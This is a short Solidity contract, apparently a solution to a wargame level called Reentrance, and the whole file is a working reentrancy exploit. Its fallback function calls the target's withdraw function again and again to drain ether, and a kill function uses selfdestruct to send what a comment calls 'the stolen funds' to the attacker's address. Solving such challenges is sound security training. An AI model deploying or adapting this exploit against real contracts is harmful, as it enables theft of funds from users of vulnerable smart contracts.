pragma solidity ^0.4.18;

import "./levels/Reentrance.sol";

contract ReentranceHack{
    Reentrance public target;
    address public owner;
    
    constructor() public {
        owner = msg.sender;
    }
    
    function attack(address _target) public payable {
        target = Reentrance(_target);
        target.donate.value(0.1 ether)(this);
        target.withdraw(0.1 ether);
    }
    
    function() public payable {
        target.withdraw(0.1 ether);
    }
    
    // NOTE:
    // You can use selfdestruct to get the stolen funds
    // from this contract
    function kill() public {
        selfdestruct(owner);
    }
    
}